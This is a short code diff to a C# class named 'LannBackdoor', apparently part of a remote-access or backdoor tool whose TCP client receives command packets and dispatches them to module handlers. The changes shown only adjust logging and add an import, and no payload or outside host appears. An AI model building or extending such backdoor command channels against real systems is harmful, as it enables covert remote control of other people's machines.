@@ -6,6 +6,7 @@ using ModulesApi;
 using Networking;
 using Networking.Packets;
 using Networking.Structures;
+using Newtonsoft.Json.Linq;
 using Serilog.Core;
 using SystemModule;
 using Constants = LannConstants.Constants;
@@ -61,7 +62,7 @@ public static class LannBackdoor {
 
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
-            Logger.Debug("Packet received: {Module}/{Handler}: {@Data}",
+            Logger.Information("Packet received: {Module}/{Handler}: {@Data}",
                 packet.ModuleName,
                 packet.HandlerName,
                 packet.GetData<object>());
@@ -93,7 +94,7 @@ public static class LannBackdoor {
                 Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
                     packet.ModuleName,
                     packet.HandlerName,
-                    e.Message);
+                    e);
             }
         };
 
